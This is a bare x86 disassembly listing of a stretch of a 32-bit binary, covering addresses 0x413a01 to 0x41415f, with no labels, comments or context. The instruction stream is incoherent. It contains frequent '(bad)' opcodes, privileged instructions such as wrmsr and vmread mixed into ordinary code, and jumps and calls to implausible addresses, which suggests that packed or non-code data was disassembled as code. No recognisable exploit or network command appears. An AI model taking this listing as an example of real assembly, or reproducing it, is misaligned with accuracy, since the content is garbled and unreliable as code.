  413a01:	add    BYTE PTR [ebp-0x74c48bbb],al
  413a07:	je     0x41398c
  413a09:	cmp    eax,edi
  413a0b:	js     0x413a30
  413a0d:	add    eax,0xeb0fc003
  413a12:	jns    0x41399f
  413a14:	vmread DWORD PTR [ecx+0x45],ebx
  413a18:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  413a1e:	adc    al,0x8b
  413a20:	jge    0x413a36
  413a22:	mov    edi,DWORD PTR [eax-0x4]
  413a25:	add    edi,DWORD PTR [edi]
  413a27:	or     bh,bh
  413a29:	push   ebp
  413a2a:	push   es
  413a2b:	mov    DWORD PTR [ebp-0x4],ebx
  413a2e:	add    edi,esi
  413a30:	pop    es
  413a31:	add    esi,DWORD PTR [edi-0x48ccf183]
  413a37:	mov    DWORD PTR [esp+esi*8],ecx
  413a3a:	inc    ebp
  413a3b:	pop    ebp
  413a3c:	xor    DWORD PTR [esi-0x4],0x3b
  413a40:	add    edx,DWORD PTR [ecx+edi*1]
  413a43:	push   es
  413a44:	clc    
  413a45:	mov    bh,0xdb
  413a47:	jp     0x413a00
  413a49:	add    cl,BYTE PTR [esi]
  413a4b:	div    DWORD PTR [edi+0x4d8b0c1c]
  413a51:	test   edi,edi
  413a53:	je     0x413a49
  413a55:	mov    eax,ecx
  413a57:	or     BYTE PTR [ebx],al
  413a59:	dec    BYTE PTR [ecx+0x7d3bec7d]
  413a5f:	jbe    0x413ad3
  413a61:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  413a67:	add    ecx,DWORD PTR [esi]
  413a69:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  413a6f:	add    eax,DWORD PTR [ebx-0x287af783]
  413a75:	je     0x413ac4
  413a77:	mov    DWORD PTR [ecx],edi
  413a79:	mov    esi,eax
  413a7b:	hlt    
  413a7c:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  413a83:	jb     0x413a45
  413a85:	jmp    0x413a72
  413a87:	xor    esi,DWORD PTR [ebx]
  413a89:	pop    edi
  413a8a:	pop    esi
  413a8b:	pop    ebx
  413a8c:	ret    
  413a8d:	ret    0x8b
  413a90:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  413a96:	xor    DWORD PTR [ecx],0xc
  413a99:	pushf  
  413a9a:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  413aa0:	wrmsr  
  413aa2:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  413aa9:	dec    ebp
  413aaa:	ret    
  413aab:	mov    edi,DWORD PTR [esi-0x4]
  413aae:	pop    eax
  413aaf:	dec    ebp
  413ab0:	jne    0x413a3d
  413ab2:	xor    edi,esp
  413ab4:	inc    eax
  413ab5:	dec    ebp
  413ab6:	jbe    0x413b0b
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	add    edx,DWORD PTR [esi+0x8]
  413abd:	push   ebp
  413abe:	dec    eax
  413abf:	push   ecx
  413ac0:	mov    eax,edi
  413ac2:	and    al,0xf0
  413ac4:	jo     0x413ab1
  413ac6:	mov    eax,DWORD PTR [ebx]
  413ac8:	sbb    BYTE PTR [ebp+0x4d],cl
  413acb:	mov    eax,DWORD PTR [ebx]
  413acd:	nop
  413ace:	or     BYTE PTR [eax],al
  413ad0:	jne    0x413b29
  413ad2:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  413ad9:	xor    edi,edi
  413adb:	add    edi,DWORD PTR [ebp+0x3]
  413ade:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  413ae4:	js     0x413a6a
  413ae6:	jae    0x413aea
  413ae8:	(bad)  
  413aea:	xor    al,0x5d
  413aec:	jmp    0x413a79
  413aee:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  413af5:	fdecstp 
  413af7:	test   BYTE PTR [edi],ah
  413af9:	add    bh,BYTE PTR [ebp+0x0]
  413afc:	add    ebx,DWORD PTR [ebp-0x77]
  413aff:	mov    edi,eax
  413b01:	cmp    al,0x0
  413b04:	adc    dh,BYTE PTR [ebx]
  413b06:	jge    0x413b0b
  413b08:	mov    edi,DWORD PTR [ebx]
  413b0a:	jl     0x413b1b
  413b0c:	clc    
  413b0d:	dec    edi
  413b0e:	jge    0x413b10
  413b10:	mov    eax,DWORD PTR [ebx]
  413b12:	jb     0x413b1c
  413b14:	mov    ecx,DWORD PTR [ebp-0x8]
  413b17:	mov    edi,edi
  413b19:	xor    edx,DWORD PTR [eax]
  413b1b:	add    edi,DWORD PTR [ebx]
  413b1d:	mov    DWORD PTR [ebp-0x10],edi
  413b20:	inc    edi
  413b21:	pop    ebp
  413b22:	jge    0x413b5f
  413b24:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  413b28:	mov    edx,0xc05d87f0
  413b2d:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  413b31:	fimul  WORD PTR [eax]
  413b33:	fist   WORD PTR [ebp+0x1c]
  413b36:	in     al,dx
  413b37:	jne    0x413b25
  413b39:	mov    edi,DWORD PTR [edx-0x7a27a10]
  413b3f:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  413b43:	fdivp  st(0),st
  413b45:	fild   WORD PTR [ebp+0x4510f85c]
  413b4b:	test   BYTE PTR [ebx+0x4d00fc02],cl
  413b51:	inc    ebp
  413b52:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  413b58:	mov    ebp,DWORD PTR [ebx-0x4]
  413b5b:	adc    al,0x8b
  413b5d:	rcl    DWORD PTR [eax],0x48
  413b60:	mov    esi,0x7080803
  413b65:	fiadd  WORD PTR [ebp+0x4d]
  413b68:	(bad)  
  413b69:	mov    edx,DWORD PTR [edx-0x4]
  413b6c:	mov    edx,DWORD PTR [ebp-0x4]
  413b6f:	xor    ebx,DWORD PTR [ebx+0x330103]
  413b75:	mov    DWORD PTR [edi+0x872dc],edi
  413b7b:	xlat   BYTE PTR ds:[ebx]
  413b7c:	into   
  413b7d:	ffreep st(6)
  413b7f:	retf   0x6c7
  413b82:	iret   
  413b83:	dec    ebp
  413b84:	inc    ebp
  413b85:	mov    DWORD PTR [ebx],edi
  413b87:	fmul   QWORD PTR [edi]
  413b89:	dec    ebp
  413b8a:	jnp    0x413bbf
  413b8c:	add    BYTE PTR [ebx],al
  413b8e:	mov    ecx,DWORD PTR [esp+edi*8]
  413b91:	inc    ebp
  413b92:	dec    ebp
  413b93:	lea    esi,[ebx]
  413b95:	add    DWORD PTR [ebx],eax
  413b97:	jb     0x413bd4
  413b99:	add    BYTE PTR [edi],cl
  413b9b:	inc    ebp
  413b9c:	imul   eax,edi,0x858bd800
  413ba2:	cld    
  413ba3:	clc    
  413ba4:	mov    DWORD PTR [ebp+0x0],eax
  413ba7:	inc    DWORD PTR [eax]
  413ba9:	or     al,0xde
  413bab:	sbb    bh,0x1
  413bae:	retf   
  413baf:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  413bb6:	dec    ebp
  413bb7:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  413bbd:	enter  0x12de,0xdf
  413bc1:	inc    ebp
  413bc2:	pop    ebp
  413bc3:	dec    DWORD PTR [ebx-0x257f0ff4]
  413bc9:	add    DWORD PTR [edx],edx
  413bcb:	add    BYTE PTR [ebp+0x50],dl
  413bce:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  413bd4:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  413bda:	or     ah,al
  413bdc:	pop    ss
  413bdd:	cdq    
  413bde:	push   ebp
  413bdf:	clc    
  413be0:	mov    eax,DWORD PTR [ebp-0x4]
  413be3:	xor    edx,edx
  413be5:	add    esi,DWORD PTR [ebx]
  413be7:	cmp    eax,DWORD PTR [ebx]
  413be9:	hlt    
  413bea:	cmp    DWORD PTR [ebx],esp
  413bec:	or     al,BYTE PTR [ebp+0xf]
  413bef:	mov    eax,DWORD PTR [edx]
  413bf1:	loopne 0x413bf3
  413bf3:	(bad)  
  413bf4:	mov    ecx,esi
  413bf6:	cld    
  413bf7:	pushf  
  413bf8:	pop    ebp
  413bf9:	pushf  
  413bfa:	mov    esi,DWORD PTR [edx]
  413bfc:	lock mov eax,eax
  413bff:	adc    BYTE PTR [ebx],al
  413c01:	or     BYTE PTR [ebx+0x4d001001],0xcf
  413c08:	xor    ebp,DWORD PTR [edi+0x50e45189]
  413c0e:	dec    ebp
  413c0f:	mov    ecx,DWORD PTR [ebx-0x31390304]
  413c15:	(bad)  
  413c16:	iret   
  413c17:	inc    ebp
  413c18:	(bad)  
  413c19:	jne    0x413c68
  413c1b:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  413c21:	(bad)  
  413c22:	cmp    ebx,eax
  413c24:	je     0x413bac
  413c26:	add    edi,edi
  413c28:	or     bh,bh
  413c2a:	dec    ebp
  413c2b:	inc    ebp
  413c2c:	mov    esi,DWORD PTR [ebx]
  413c2e:	cld    
  413c2f:	add    ecx,esi
  413c31:	cmp    ecx,DWORD PTR [eax-0xc]
  413c34:	mov    edx,DWORD PTR [edi]
  413c36:	or     BYTE PTR [ebp-0x7c],al
  413c39:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  413c40:	or     al,0x9c
  413c42:	inc    ebp
  413c43:	xor    bh,BYTE PTR [ecx+ecx*4]
  413c46:	pushf  
  413c47:	call   0x522bd7
  413c4c:	jne    0x413c15
  413c4e:	mov    ebp,esp
  413c50:	fcomp  DWORD PTR [ebx]
  413c52:	add    BYTE PTR [ecx],al
  413c54:	inc    DWORD PTR [ebp-0x75]
  413c57:	(bad)  
  413c58:	cld    
  413c59:	add    al,0xce
  413c5b:	mov    ecx,edi
  413c5d:	cld    
  413c5e:	inc    ebp
  413c5f:	fidivr WORD PTR [ebx]
  413c61:	fbstp  TBYTE PTR [ebp-0x3e]
  413c64:	mov    eax,DWORD PTR [eax]
  413c66:	adc    BYTE PTR [ebx-0x3974038b],cl
  413c6c:	fadd   st,st(7)
  413c6e:	add    BYTE PTR [ebp-0x1],al
  413c71:	mov    ecx,DWORD PTR [esp+edi*8]
  413c74:	inc    ebp
  413c75:	mov    bh,0xc7
  413c78:	loopne 0x413cbf
  413c7a:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  413c80:	sbb    BYTE PTR [ebx],dh
  413c82:	pushf  
  413c83:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  413c89:	mov    eax,edi
  413c8b:	cwde   
  413c8c:	inc    ebp
  413c8d:	inc    ebp
  413c8e:	jne    0x413c1b
  413c90:	mov    esp,esp
  413c92:	clc    
  413c93:	add    al,0x4d
  413c95:	mov    DWORD PTR [ebx],esi
  413c97:	or     al,0x33
  413c99:	inc    ebp
  413c9a:	lea    ecx,[ebx-0x398d13fd]
  413ca0:	add    bh,al
  413ca2:	inc    ebp
  413ca3:	ror    DWORD PTR [ebx+0x45d829],0x8b
  413caa:	add    ebp,esp
  413cac:	shufps xmm1,xmm3,0xc7
  413cb0:	(bad)  
  413cb1:	jmp    0x748677da
  413cb6:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  413cbc:	hlt    
  413cbd:	mov    ecx,DWORD PTR [edi]
  413cbf:	fadd   DWORD PTR [ebp+0x0]
  413cc2:	xor    ecx,DWORD PTR [edi]
  413cc4:	add    ecx,ecx
  413cc6:	cmp    edi,edi
  413cc8:	pmuludq mm7,QWORD PTR [edx+0x50]
  413ccc:	(bad)  
  413ccd:	jmp    0x413c5a
  413ccf:	mov    edi,esp
  413cd1:	or     al,0xc6
  413cd3:	inc    ebp
  413cd4:	(bad)  
  413cd5:	mov    eax,DWORD PTR [ebp+0x10]
  413cd8:	jne    0x413c63
  413cda:	mov    eax,DWORD PTR [ecx]
  413cdc:	clc    
  413cdd:	add    BYTE PTR [ebp-0x40],cl
  413ce0:	xor    edx,DWORD PTR [eax-0x73]
  413ce3:	jne    0x413ce6
  413ce5:	push   DWORD PTR [edx+0x8]
  413ce8:	add    BYTE PTR [ebp+0x45],al
  413ceb:	mov    ebp,ecx
  413ced:	cld    
  413cee:	add    BYTE PTR [ebp+0x0],cl
  413cf1:	xor    eax,DWORD PTR [ebp+0x3]
  413cf4:	mov    DWORD PTR [ebx],edi
  413cf6:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  413cfc:	sub    eax,0x5d330e4d
  413d01:	lea    esi,[ebx]
  413d03:	add    DWORD PTR [ebx],eax
  413d05:	jb     0x413cf0
  413d07:	add    BYTE PTR [eax],al
  413d09:	inc    ebp
  413d0a:	add    bl,ch
  413d0c:	inc    ebp
  413d0d:	mov    esi,DWORD PTR [ebx]
  413d0f:	or     al,0x3
  413d11:	(bad)  
  413d12:	mov    edi,eax
  413d14:	in     al,dx
  413d15:	scas   eax,DWORD PTR es:[edi]
  413d16:	inc    ebp
  413d17:	mov    esi,DWORD PTR [ebx]
  413d19:	in     al,0x3
  413d1b:	add    al,0x89
  413d1d:	mov    ecx,DWORD PTR [eax+edi*8]
  413d20:	dec    ebp
  413d21:	(bad)  
  413d22:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  413d29:	mov    ecx,eax
  413d2b:	cld    
  413d2c:	push   es
  413d2d:	dec    ebp
  413d2e:	add    al,0x33
  413d30:	mov    DWORD PTR [ebx],eax
  413d32:	in     al,dx
  413d33:	cmp    DWORD PTR [ebp-0x67],eax
  413d36:	mov    eax,DWORD PTR [ebp-0xba0068]
  413d3c:	mov    edx,DWORD PTR [ebp-0x4]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  413d42:	xor    ecx,DWORD PTR [ebp+0x3]
  413d45:	cmp    DWORD PTR [ebx],0x8b32749b
  413d4b:	xor    edi,esp
  413d4d:	jmp    0xff753a9f
  413d52:	add    ecx,DWORD PTR [ebp-0x3f]
  413d55:	xor    ebx,DWORD PTR [edi]
  413d57:	add    eax,ecx
  413d59:	cmp    ebx,DWORD PTR [eax]
  413d5b:	mov    ecx,DWORD PTR [ebp-0x4]
  413d5e:	mov    ecx,DWORD PTR [eax]
  413d60:	adc    BYTE PTR [ebp-0x80],al
  413d63:	jmp    0x413d66
  413d65:	mov    eax,DWORD PTR [eax]
  413d67:	cld    
  413d68:	mov    bh,0xc6
  413d6a:	push   ecx
  413d6b:	(bad)  
  413d6c:	jne    0x413dcc
  413d6e:	dec    ecx
  413d70:	or     BYTE PTR [ecx+ebx*1],cl
  413d73:	push   ebp
  413d74:	inc    ebp
  413d75:	in     al,dx
  413d76:	add    ebp,esp
  413d78:	or     bh,al
  413d7a:	dec    ebp
  413d7b:	cld    
  413d7c:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  413d82:	xor    DWORD PTR [eax],0x2
  413d85:	pushf  
  413d86:	dec    DWORD PTR [ebx+0x45510cf4]
  413d8c:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  413d92:	mov    edx,DWORD PTR [ecx+0xc]
  413d95:	xor    eax,esi
  413d97:	mov    edx,0xc172c7
  413d9c:	inc    ebp
  413d9d:	mov    esi,DWORD PTR [ebp+0x8]
  413da0:	mov    eax,edx
  413da2:	call   0x84c60497
  413da7:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  413dae:	call   0x4db14dbb
  413db3:	push   edi
  413db4:	xor    esi,DWORD PTR [ebp+0x3]
  413db7:	(bad)  
  413db8:	pmulhuw mm0,mm1
  413dbb:	test   DWORD PTR [ebp-0x8],ecx
  413dbe:	mov    DWORD PTR [ebp-0x67],eax
  413dc1:	mov    eax,DWORD PTR [ebp-0x4]
  413dc4:	xor    edi,DWORD PTR [ebp-0x73]
  413dc7:	xor    eax,DWORD PTR [ebx]
  413dc9:	xor    esi,DWORD PTR [edx+0x3]
  413dcc:	add    BYTE PTR [ecx],bh
  413dce:	inc    ebp
  413dcf:	(bad)  
  413dd0:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  413dd6:	mov    DWORD PTR [eax],0x750f0004
  413ddc:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  413de2:	lock add BYTE PTR [ebp+0x0],al
  413de6:	mov    esi,DWORD PTR [ebp-0x2c]
  413de9:	mov    ebp,edx
  413deb:	or     al,0x72
  413ded:	ja     0x413def
  413def:	mov    edx,esi
  413df1:	cld    
  413df2:	(bad)  
  413df5:	cli    
  413df6:	mov    esi,DWORD PTR [ebp-0x4]
  413df9:	cmp    ecx,esi
  413dfb:	bswap  edi
  413dfd:	(bad)
  413e01:	mov    esi,DWORD PTR [ebp-0x4]
  413e04:	mov    esi,ecx
  413e06:	clc    
  413e07:	repnz add esi,DWORD PTR [ebp+0x45]
  413e0b:	push   ebx
  413e0c:	xor    eax,DWORD PTR [ebp+0x3]
  413e0f:	xor    bl,BYTE PTR [edi-0x64]
  413e12:	pop    ebx
  413e13:	jmp    0x413eda
  413e18:	mov    esi,DWORD PTR [ebp-0x7d]
  413e1b:	xor    ebp,DWORD PTR [eax]
  413e1d:	lea    eax,[ebp-0x8]
  413e20:	xor    edx,esi
  413e22:	pushf  
  413e23:	out    dx,eax
  413e24:	(bad)  
  413e25:	neg    eax
  413e27:	ins    DWORD PTR es:[edi],dx
  413e28:	test   esi,edi
  413e2a:	clc    
  413e2b:	pop    esp
  413e2c:	inc    ebp
  413e2d:	or     BYTE PTR [ecx+0x450f0c7d],cl
  413e33:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  413e39:	add    cl,al
  413e3b:	jne    0x413dd9
  413e3d:	mov    esi,DWORD PTR [edx]
  413e3f:	in     al,dx
  413e40:	push   esi
  413e41:	xor    BYTE PTR [ebp-0xe],dh
  413e44:	add    edi,esi
  413e46:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  413e4c:	add    cl,bh
  413e4e:	mov    edi,DWORD PTR [ebp+0x8]
  413e51:	mov    DWORD PTR [ebp-0x14],esi
  413e54:	add    esi,DWORD PTR [ebp+0x3c]
  413e57:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  413e5d:	mov    ah,0x3c
  413e5f:	pushf  
  413e60:	pushf  
  413e61:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  413e67:	jne    0x413df4
  413e69:	mov    ecx,DWORD PTR [esp+ebp*8]
  413e6c:	icebp  
  413e6d:	icebp  
  413e6e:	shl    edx,0xf2
  413e71:	(bad)  
  413e72:	mov    ah,0x16
  413e74:	pop    eax
  413e75:	jne    0x413e0a
  413e77:	mov    ecx,DWORD PTR [edi]
  413e79:	in     al,dx
  413e7a:	jmp    0x413e6d
  413e7c:	add    dl,dh
  413e7e:	mov    edi,esi
  413e80:	or     al,0x8
  413e82:	inc    ebp
  413e83:	jne    0x413e88
  413e85:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  413e8b:	ret    
  413e8c:	or     bh,bh
  413e8e:	jge    0x413e78
  413e90:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  413e96:	xor    edi,eax
  413e98:	add    esi,DWORD PTR [ebp-0x77]
  413e9b:	mov    ebx,esp
  413e9d:	clc    
  413e9e:	neg    DWORD PTR [ebp-0x7c]
  413ea1:	xor    eax,DWORD PTR [eax]
  413ea3:	cmp    eax,DWORD PTR [eax]
  413ea5:	repz jne 0x413e3d
  413ea8:	xor    eax,DWORD PTR [ecx]
  413eaa:	add    ebx,DWORD PTR [eax]
  413eac:	mov    DWORD PTR [ebp-0x8],eax
  413eaf:	mov    eax,edi
  413eb1:	cld    
  413eb2:	lock pop eax
  413eb4:	test   DWORD PTR [ebx],esi
  413eb6:	clc    
  413eb7:	add    edx,DWORD PTR [edi-0x740bff77]
  413ebd:	fdivp  st(4),st
  413ebf:	test   ecx,esi
  413ec1:	(bad)  
  413ec2:	jnp    0x413ec3
  413ec4:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  413eca:	jae    0x413e57
  413ecc:	sub    edi,esp
  413ece:	(bad)  
  413ecf:	shl    DWORD PTR [eax-0x3e],0x89
  413ed3:	leave  
  413ed4:	call   0x8196f5e1
  413ed9:	in     al,dx
  413eda:	(bad)  
  413edb:	in     al,dx
  413edc:	add    bh,al
  413ede:	mov    esp,edi
  413ee0:	in     al,dx
  413ee1:	test   DWORD PTR [ebp-0x8],edi
  413ee4:	mov    eax,DWORD PTR [ebp+0x2b]
  413ee7:	xor    BYTE PTR [ebx],al
  413ee9:	pushf  
  413eea:	jnp    0x57303b23
  413ef0:	xor    edx,DWORD PTR [ebp-0x77]
  413ef3:	push   ecx
  413ef4:	loopne 0x413f29
  413ef6:	jne    0x413eb3
  413ef8:	mov    esi,DWORD PTR [edx-0x20]
  413efb:	add    BYTE PTR [ebp-0x3d],bh
  413efe:	xor    eax,DWORD PTR [ebp-0x73]
  413f01:	mov    edi,DWORD PTR [esi]
  413f03:	cld    
  413f04:	jb     0x413ecc
  413f06:	add    bl,al
  413f08:	jne    0x413f4f
  413f0a:	mov    edx,DWORD PTR [edi-0x10]
  413f0d:	jge    0x413f8c
  413f0f:	mov    esi,DWORD PTR [ebx]
  413f11:	lock add ecx,DWORD PTR [ebp+0x3b]
  413f15:	xor    esi,DWORD PTR [ebp-0x77]
  413f18:	mov    esi,eax
  413f1a:	lock inc ebp
  413f1c:	jge    0x413f4f
  413f1e:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  413f25:	dec    ebp
  413f26:	mov    esi,DWORD PTR [ebx]
  413f28:	loopne 0x413eb3
  413f2a:	jge    0x413f24
  413f2c:	add    DWORD PTR [ebp-0x7d],eax
  413f2f:	icebp  
  413f30:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  413f37:	dec    ebp
  413f38:	hlt    
  413f39:	xor    ebx,DWORD PTR [ebp-0x77]
  413f3c:	mov    esi,esp
  413f3e:	in     al,0x45
  413f40:	jge    0x413f7f
  413f42:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  413f49:	dec    ebp
  413f4a:	pop    esp
  413f4b:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  413f51:	inc    ebp
  413f52:	hlt    
  413f53:	xor    DWORD PTR [ebp-0x61],esi
  413f56:	mov    edi,DWORD PTR [eax+0xf19504]
  413f5c:	repnz mov DWORD PTR [ebp+0x20],ebx
  413f60:	cmp    eax,DWORD PTR [ebp+0xf]
  413f63:	test   DWORD PTR [edi+ecx*1-0x1],edx
  413f67:	fistp  WORD PTR [ebx+0x0]
  413f6a:	inc    ebp
  413f6b:	mov    ebx,DWORD PTR [edi+0xc]
  413f6e:	add    eax,eax
  413f70:	inc    ebp
  413f71:	test   BYTE PTR [ebx],dh
  413f73:	add    eax,DWORD PTR [ebx]
  413f75:	add    BYTE PTR [esi+0x45],bl
  413f78:	ret    0x85
  413f7b:	jnp    0x5441c34a
  413f81:	inc    bp
  413f83:	inc    ebp
  413f84:	xor    DWORD PTR [ecx+0xc78a9c],edi
  413f8a:	fdiv   QWORD PTR [ebx]
  413f8c:	test   DWORD PTR [ecx+0x453bf8],edi
  413f92:	push   ebx
  413f93:	add    edi,DWORD PTR [esi+0x708088b]
  413f99:	cmp    esi,eax
  413f9b:	setl   BYTE PTR [ecx-0x74fcffce]
  413fa2:	mov    esp,edi
  413fa4:	call   0x33cc84f6
  413fa9:	or     BYTE PTR [ebx],al
  413fab:	inc    ecx
  413fac:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  413fb2:	and    BYTE PTR [ebp-0x7074f0bb],al
  413fb8:	lock add cl,al
  413fbb:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  413fc2:	mov    ch,0x45
  413fc4:	clc    
  413fc5:	xor    eax,DWORD PTR [ebp+0x3]
  413fc8:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  413fce:	inc    ebp
  413fcf:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  413fd5:	mov    edi,eax
  413fd7:	mov    eax,DWORD PTR [ebp+0x3c]
  413fda:	mov    ecx,DWORD PTR [eax]
  413fdc:	hlt    
  413fdd:	inc    ebp
  413fde:	ror    DWORD PTR [ebx+0x818c45],0xf4
  413fe5:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  413feb:	push   ebp
  413fec:	mov    edi,DWORD PTR [ebx]
  413fee:	in     al,dx
  413fef:	jne    0x413fb2
  413ff1:	mov    eax,DWORD PTR [ebp-0x28]
  413ff4:	add    DWORD PTR [eax],0xe8058dec
  413ffa:	clc    
  413ffb:	mov    esi,DWORD PTR [edi-0x8]
  413ffe:	add    dh,dl
  414000:	rol    WORD PTR [ebp-0x1],cl
  414004:	mov    edx,DWORD PTR [eax+0x8]
  414007:	jne    0x413fc9
  414009:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  414010:	inc    ebp
  414011:	push   esp
  414012:	test   DWORD PTR [ecx+0xf],ecx
  414015:	sub    edx,esp
  414017:	add    eax,DWORD PTR [eax]
  414019:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  41401f:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  414026:	mov    eax,DWORD PTR [ecx]
  414028:	and    BYTE PTR [eax],al
  41402a:	adc    BYTE PTR ds:[eax],al
  41402d:	inc    ebp
  41402e:	inc    cx
  414031:	push   esp
  414032:	add    al,0x75
  414034:	add    BYTE PTR [edx+0x66],dl
  414037:	enter  0xc1,0x4d
  41403b:	mov    esp,DWORD PTR [esi+0x20]
  41403e:	add    DWORD PTR [ecx-0x7b],eax
  414041:	add    eax,DWORD PTR [ebx]
  414043:	str    WORD PTR [eax+0x45]
  414047:	lea    ecx,[ebx+0x45890801]
  41404d:	sbb    BYTE PTR [ebx],al
  41404f:	dec    ebp
  414050:	cmp    al,0xf
  414052:	inc    ebp
  414053:	push   eax
  414054:	mov    esi,DWORD PTR [ebx]
  414056:	push   eax
  414057:	add    eax,eax
  414059:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  414060:	inc    ebp
  414061:	add    BYTE PTR [ecx],dh
  414063:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  41406a:	(bad)  
  41406b:	mov    ebx,eax
  41406d:	loopne 0x4140b4
  41406f:	dec    ebp
  414070:	mov    ecx,DWORD PTR [edi]
  414072:	cld    
  414073:	push   eax
  414074:	xchg   DWORD PTR [ebx],esi
  414076:	add    DWORD PTR [ebx],ebp
  414078:	add    BYTE PTR [ebx],ch
  41407a:	or     BYTE PTR [ecx],bh
  41407c:	dec    ecx
  41407d:	loopne 0x414082
  41407f:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  414085:	push   ebp
  414086:	add    DWORD PTR [ebx+0x55100800],eax
  41408c:	dec    ebp
  41408d:	jmp    0x414018
  41408f:	mov    esp,DWORD PTR [eax]
  414091:	sbb    dl,dl
  414093:	inc    eax
  414094:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  41409a:	add    BYTE PTR [ebx+0x74528555],cl
  4140a0:	push   ebp
  4140a1:	div    DWORD PTR [ebx]
  4140a3:	and    eax,DWORD PTR [ebx]
  4140a5:	add    edx,DWORD PTR [edx-0x30]
  4140a8:	jno    0x414035
  4140aa:	inc    DWORD PTR [eax+eiz*1]
  4140ad:	inc    ebp
  4140ae:	push   eax
  4140af:	push   eax
  4140b0:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4140b6:	mov    edi,esp
  4140b8:	push   eax
  4140b9:	inc    ebp
  4140ba:	enter  0x458b,0x8
  4140be:	push   ecx
  4140bf:	(bad)  
  4140c0:	call   0x10b4a98
  4140c5:	pop    ss
  4140c6:	push   ebp
  4140c7:	mov    ecx,DWORD PTR [ebx+0x489408]
  4140cd:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4140d3:	push   ecx
  4140d4:	jo     0x4140be
  4140d6:	inc    DWORD PTR [edi]
  4140d8:	or     BYTE PTR [eax],al
  4140da:	call   0xcc4824
  4140df:	fmul   QWORD PTR [ebp+0x55]
  4140e2:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4140e8:	mov    bh,0x8c
  4140ea:	adc    al,0x9c
  4140ec:	dec    esp
  4140ed:	xor    bl,BYTE PTR [eax]
  4140ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4140f2:	mov    eax,DWORD PTR [ebp-0x4]
  4140f5:	mov    esi,DWORD PTR [edi-0x3148f924]
  4140fb:	push   es
  4140fc:	retf   
  4140fd:	mov    BYTE PTR [ebp-0x30],0x3b
  414101:	inc    ebp
  414102:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  414109:	retf   0x83fc
  41410c:	into   
  41410d:	dec    ebp
  41410e:	retf   
  41410f:	mov    ecx,DWORD PTR [ebp-0x74]
  414112:	mov    eax,DWORD PTR [eax]
  414114:	fdiv   QWORD PTR [ebx]
  414116:	mov    bh,0x3
  414118:	push   es
  414119:	mov    esi,ecx
  41411b:	sbb    cl,dl
  41411d:	dec    ebp
  41411e:	sar    DWORD PTR [ebx],cl
  414120:	push   ebp
  414121:	jne    0x414132
  414123:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  414129:	lea    ebx,[eax]
  41412b:	call   0xf4caccf2
  414130:	sbb    dh,dl
  414132:	add    edx,ebx
  414134:	push   ebp
  414135:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  41413b:	push   ecx
  41413c:	mov    DWORD PTR [eax-0x30],edx
  41413f:	test   DWORD PTR [edx],eax
  414141:	xadd   esp,esi
  414144:	pop    es
  414145:	add    cl,dl
  414147:	mov    eax,ecx
  414149:	or     al,0x45
  41414b:	(bad)  
  41414c:	push   eax
  41414d:	add    DWORD PTR [edx+0x0],eax
  414150:	add    ecx,DWORD PTR [ecx]
  414152:	and    dh,cl
  414154:	call   0xc54a24
  414159:	add    DWORD PTR [ebp+0x0],edx
  41415c:	mov    esp,DWORD PTR [ebp+0x18]
  41415f:	add    BYTE PTR [eax+0x54],cl
